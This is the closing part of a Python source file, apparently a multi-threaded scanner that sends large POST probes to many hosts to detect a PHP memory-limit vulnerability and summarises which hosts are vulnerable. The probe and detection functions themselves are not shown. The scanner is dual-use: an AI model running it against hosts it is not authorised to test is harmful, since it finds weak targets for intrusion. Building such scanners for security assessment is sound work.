        for name in ("RED", "GREEN", "YELLOW", "CYAN", "WHITE", "BOLD", "RESET"):
            setattr(Colors, name, "")

    def info(msg, color=Colors.CYAN):
        if not args.quiet:
            print(colorize(msg, color))

    try:
        custom_headers = parse_headers(args.headers)
    except ValueError as exc:
        raise SystemExit(str(exc)) from exc

    loaded_hosts = [args.url] if args.url else load_lines(args.list, "host")
    hosts = deduplicate_hosts(loaded_hosts)
    if not hosts:
        raise SystemExit("No hosts to scan")

    paths: Optional[List[str]] = None
    if args.path_file:
        paths = load_lines(args.path_file, "path")
    elif args.paths:
        paths = args.paths
    if paths == []:
        raise SystemExit("No paths to scan")

    if not args.quiet:
        print_banner()
    info(f"[*] Loaded {len(hosts)} host(s) to scan")
    if len(hosts) != len(loaded_hosts):
        info(f"[*] Skipped {len(loaded_hosts) - len(hosts)} duplicate host(s)")
    info(f"[*] Testing {len(paths)} custom path(s)" if paths
         else f"[*] Default path: {DEFAULT_PATH}")
    info(f"[*] Using {args.threads} thread(s)")
    info(f"[*] Timeout: {args.timeout}s")
    info(f"[*] SAPI rules: {args.sapi}")
    info(f"[*] Probe sizes: {', '.join(format_mib(s) for s in sizes)} "
         f"(detects memory_limit up to ~{peak_mib:.0f} MiB)")
    if args.max_probe_mib >= DEFAULT_POST_MAX_SIZE_MIB:
        info(f"[!] Probes of {DEFAULT_POST_MAX_SIZE_MIB} MiB or more are ignored by "
             "PHP unless post_max_size was raised", Colors.YELLOW)
    if args.insecure:
        info("[!] TLS verification disabled", Colors.YELLOW)
    if not args.quiet:
        print()

    verify_ssl = not args.insecure
    results: List[dict] = []

    def scan(host: str) -> dict:
        try:
            return check_vulnerability(
                host, timeout=args.timeout, verify_ssl=verify_ssl,
                custom_headers=custom_headers, sapi=args.sapi, paths=paths, sizes=sizes,
            )
        except Exception as exc:  # Keep one bad target from aborting a scan.
            result = base_result(safe_url_label(host))
            result["error"] = result["reason"] = f"unexpected error: {exc}"
            return result

    def emit(result: dict) -> None:
        if result["vulnerable"] is True or (not args.quiet and args.verbose):
            print_result(result, args.verbose)

    if len(hosts) > 1:
        for size_mib in sizes:
            build_probe_body(size_mib)
            build_baseline_body(size_mib)

    if len(hosts) == 1:
        results.append(scan(hosts[0]))
        if not args.quiet or results[0]["vulnerable"] is True:
            print_result(results[0], args.verbose)
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(scan, host): host for host in hosts}
            with ProgressBar(len(hosts), disable=args.quiet) as progress:
                for future in as_completed(futures):
                    result = future.result()
                    results.append(result)
                    if args.quiet:
                        emit(result)
                    else:
                        with progress.suspended():
                            emit(result)
                    progress.update()

    vulnerable_count = sum(r["vulnerable"] is True for r in results)
    error_count = sum(r["vulnerable"] is None for r in results)
    if not args.quiet:
        print()
        info("=" * 60)
        info("SCAN SUMMARY", Colors.BOLD)
        info("=" * 60)
        print(f"  Total hosts scanned: {len(hosts)}")
        label = f"Vulnerable: {vulnerable_count}"
        print("  " + (colorize(label, Colors.RED + Colors.BOLD)
                      if vulnerable_count else label))
        print(f"  Not vulnerable: {len(results) - vulnerable_count - error_count}")
        print(f"  Inconclusive/errors: {error_count}")
        info("=" * 60)

    if args.output and not save_results(
        results, args.output, vulnerable_only=not args.all_results,
        announce=not args.quiet,
    ):
        raise SystemExit(2)
    raise SystemExit(1 if vulnerable_count else 0)


if __name__ == "__main__":
    main()
